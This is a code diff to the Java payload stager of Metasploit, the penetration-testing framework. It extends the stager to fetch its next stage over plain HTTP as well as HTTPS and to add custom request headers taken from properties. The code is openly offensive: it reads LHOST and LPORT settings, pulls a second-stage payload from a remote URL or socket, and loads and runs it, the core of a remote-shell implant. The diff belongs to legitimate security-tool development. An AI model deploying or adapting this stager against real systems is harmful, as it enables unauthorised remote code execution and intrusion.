@@ -52,6 +52,7 @@ import java.security.CodeSource;
 import java.security.Permissions;
 import java.security.ProtectionDomain;
 import java.security.cert.Certificate;
+import java.util.Enumeration;
 import java.util.Locale;
 import java.util.Properties;
 import java.util.Stack;
@@ -175,7 +176,7 @@ public class Payload extends ClassLoader {
             int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
             String lHost = props.getProperty("LHOST", null);
             String url = props.getProperty("URL", null);
-            InputStream in;
+            InputStream in = null;
             OutputStream out;
             if (lPort <= 0) {
                 // debug code: just connect to stdin/stdout
@@ -186,14 +187,16 @@ public class Payload extends ClassLoader {
                 if (url.startsWith("raw:"))
                     // for debugging: just use raw bytes from property file
                     in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
-                else if (url.startsWith("https:")) {
+                else if (url.startsWith("http")) {
                     URLConnection uc = new URL(url).openConnection();
                     // load the trust manager via reflection, to avoid loading
                     // it when it is not needed (it requires Sun Java 1.4+)
-                    Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+                    if (url.startsWith("https:")) {
+                        Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
+                    }
+                    addRequestHeaders(uc, props);
                     in = uc.getInputStream();
-                } else
-                    in = new URL(url).openStream();
+                }
                 out = new ByteArrayOutputStream();
             } else {
                 Socket socket;
@@ -226,6 +229,21 @@ public class Payload extends ClassLoader {
                 stageParams[i] = stageParamTokenizer.nextToken();
             }
             new Payload().bootstrap(in, out, props.getProperty("EmbeddedStage", null), stageParams);
+        }
+    }
+
+    private static void addRequestHeaders(URLConnection connection, Properties props) {
+        Enumeration<?> properties = props.propertyNames();
+        while (properties.hasMoreElements()) {
+            Object property = properties.nextElement();
+            if (property instanceof String) {
+                String propertyKey = (String) property;
+                if (propertyKey.startsWith("Header")) {
+                    connection.addRequestProperty(
+                            propertyKey.substring(6),
+                            props.getProperty(propertyKey));
+                }
+            }
         }
     }
 
